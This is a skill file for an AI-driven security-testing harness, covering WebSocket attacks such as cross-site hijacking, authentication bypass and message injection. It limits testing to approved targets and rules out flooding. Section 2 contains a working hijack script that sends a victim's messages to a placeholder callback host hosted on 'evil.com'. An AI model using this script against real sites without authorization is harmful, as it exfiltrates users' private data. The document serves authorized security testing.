---
name: harness-websocket
description: "Test WebSocket security: CSWSH, authentication bypass, injection, message tampering, and origin validation."
---

# WebSocket — hijack, injection, auth bypass

Source: `testing-websockets`, `cross-site-websocket-hijacking` (2024: CSWSH via missing Origin check, binary message injection, chat application message spoofing).

## Gate

Approved `host+ws endpoint` only. Every command via `cyber_process` `argv`. One message per test. No flood, no DoS. → `harness-vuln-triage` before `cyber_finding`.

## Steps

### 1. WebSocket discovery and handshake analysis

Identify WebSocket endpoints:
- Check page source/JS for `new WebSocket(` or `ws://` / `wss://`
- Check Network tab for `101 Switching Protocols`
- Check for Socket.IO (`/socket.io/?EIO=4&transport=websocket`) or SockJS

Record the handshake:
- `Upgrade: websocket` and `Connection: Upgrade`
- `Sec-WebSocket-Key` and `Sec-WebSocket-Accept`
- `Sec-WebSocket-Protocol` (subprotocol)
- `Origin` header sent by the client
- Cookies sent during handshake

### 2. Cross-Site WebSocket Hijacking (CSWSH)

Test if the server validates the Origin header:
```html
<script>
var ws = new WebSocket('wss://target/ws');
ws.onmessage = function(e) {
  fetch('https://CALLBACK/cswsh?data=' + btoa(e.data));
};
ws.onopen = function() {
  ws.send('{"action":"get_profile"}');
};
</script>
```

Host this on `evil.com`. If the server accepts the connection with cookies from `target.com`:
- The WebSocket inherits the victim's session
- Messages received contain victim's data → CSWSH confirmed

Check:
- Does the server check `Origin`?
- Does it accept `Origin: null`?
- Does it accept any `Origin`?

### 3. Authentication and authorization

- Connect without cookies/token → should fail
- Connect with expired token → should fail
- Connect with valid token → enumerate accessible actions
- Send privileged messages with low-privilege token → should be rejected
- Check if the token is validated only at handshake or per-message

### 4. Message injection and manipulation

For each message type the application uses:
- Modify message fields (IDs, usernames, amounts)
- Inject unexpected fields
- Send malformed JSON/binary
- Test for SQL injection in message fields
- Test for command injection in message fields
- Test XSS if messages are rendered in the UI

### 5. Rate limiting and DoS (bounded)

- Send 100 rapid messages → check if rate-limited
- Send a very large message (>64KB) → check if accepted
- Open multiple connections with the same token → check limit
- Note: do NOT perform sustained flooding

### 6. Protocol-specific tests

**Socket.IO:**
- Enumerate rooms and namespaces
- Join rooms without authorization
- Emit events the client shouldn't have access to

**GraphQL over WebSocket:**
- Subscription injection
- Unauthorized subscription to sensitive data

### 7. Negative controls

- Control 1: legitimate WebSocket connection works (positive control)
- Control 2: connection from unauthorized origin rejected
- Control 3: privileged action with unprivileged token rejected

## Proof contract

A finding needs: (1) identified WebSocket endpoint and protocol, (2) demonstrated bypass (CSWSH, auth bypass, injection), (3) OOB callback or data exfiltration proof, (4) reproduction, (5) three negative controls. A successful WebSocket connection alone is not a finding.

## Done

Each finding cites the endpoint, the attack vector (CSWSH/injection/auth bypass), the data accessed, and the negative controls.
